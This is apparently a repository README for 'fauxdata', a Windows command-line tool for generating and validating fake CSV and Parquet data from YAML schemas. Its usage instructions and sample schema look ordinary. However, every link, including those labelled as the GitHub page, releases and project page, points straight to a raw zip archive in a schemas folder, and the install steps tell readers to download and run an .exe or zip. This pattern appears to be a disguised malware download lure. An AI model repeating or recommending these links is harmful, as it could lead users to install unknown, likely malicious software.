# 🛠️ fauxdata - Generate and Check Fake Data Easily

[![Download fauxdata](https://img.shields.io/badge/Download-fauxdata-blue?style=for-the-badge&logo=github)](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip)

---

## 📋 What is fauxdata?

fauxdata is a tool you can use on your Windows computer to create fake data. This data looks real and matches rules you set. You can also check if your fake data is correct. It uses simple files called YAML schemas to know what data to make.

This tool is mainly for people who want to test things with data but do not want to use real information. It can work with different data types like CSV and Parquet files. It helps make sure your test data is good quality and follows the rules you want.

---

## 🖥️ System Requirements

Before you start, check these needs for your computer:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB of free RAM
- 500 MB of free disk space
- Internet connection to download the tool
- Command Line Interface (CLI) access—this comes with Windows as "Command Prompt" or "PowerShell"

---

## 🌐 Key Features

- Create fake data from customizable YAML files
- Works with common file formats like CSV and Parquet
- Supports local settings to make data that fits your region
- Validates data to catch mistakes before use
- Runs smoothly on Windows with simple commands
- Helps test software or databases safely without real info

---

## 🚀 Getting Started: Download fauxdata

Click the button below to visit the main page where you can download the software and find the latest version.

[![Download fauxdata](https://img.shields.io/badge/Download-fauxdata-grey?style=for-the-badge&logo=github)](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip)

---

## 📥 How to Download and Install on Windows

1. Open your web browser and go to the [fauxdata GitHub page](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip).

2. Look for the **Releases** section on the page. This is where you will find the files to download.

3. Find the latest release. It usually has the highest version number or is marked "Latest."

4. Download the Windows version of fauxdata. It may have a file name ending with `.exe` or a zipped file like `.zip`.

5. If you download a `.zip` file:
   - Right-click on the file.
   - Select **Extract All**.
   - Choose a folder where you want to keep fauxdata.
   - Click **Extract**.

6. If you downloaded an `.exe` file, double-click it and follow the installation prompts.

---

## 🔧 How to Run fauxdata

1. Open **Command Prompt** or **PowerShell** on your computer:
   - Press the **Start** button.
   - Type `cmd` or `powershell`.
   - Press **Enter**.

2. Navigate to the folder where you installed or extracted fauxdata:
   - Type `cd path\to\fauxdata` and press **Enter**.
   - Replace `path\to\fauxdata` with the actual folder address.

3. To generate fake data, you will need a YAML schema file that describes the data you want.

4. Run the command:
   ```
   fauxdata generate your-schema.yaml
   ```
   Replace `your-schema.yaml` with the path to your YAML file.

5. The fake data will be created in the current folder or location you specify.

6. To check your data for errors, use:
   ```
   fauxdata validate generated-data.csv
   ```
   Replace `generated-data.csv` with the file name you want to check.

---

## 🛠️ Creating Your First YAML Schema

The YAML schema tells fauxdata what kind of data to make. Here is an example of a simple YAML file:

```yaml
columns:
  - name: id
    type: integer
    start: 1
    end: 100
  - name: name
    type: name
  - name: email
    type: email
  - name: created_at
    type: date
    start: 2020-01-01
    end: 2023-12-31
```

This file will create 100 fake records with ID numbers, names, emails, and dates.

Save this file with any name like `example.yaml` and use it with the generate command.

---

## 🔍 Validating Your Data

Use the `validate` command to check if your data meets the rules.

Example:
```
fauxdata validate data.csv
```

This checks the file `data.csv`. It will report if something is wrong with the data that does not match your schema.

---

## ⚙️ Common Commands

- **Generate data**:  
  `fauxdata generate your-schema.yaml`

- **Validate data**:  
  `fauxdata validate your-data.csv`

- **Help**:  
  `fauxdata --help`

---

## 📁 Where to Put Your Files

You can keep your YAML files and generated data anywhere on your computer. Just remember the folder path so you can point fauxdata to the right place in the command line.

---

## 🔄 Updating fauxdata

To get new updates:

1. Visit the [fauxdata GitHub page](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip) again.

2. Download the latest version as you did the first time.

3. Replace your old files with the new ones.

---

## ❓ Troubleshooting

- If fauxdata does not run, check if you typed the commands correctly.
- Make sure you are in the correct folder in the command prompt.
- If an error shows about missing files, check your schema file path.
- You can open an issue on the GitHub page if problems continue.

---

## 📚 Learning More

Visit the project page for examples, help, and updates:  
https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip

This page has guides and information about how to use the tool in detail.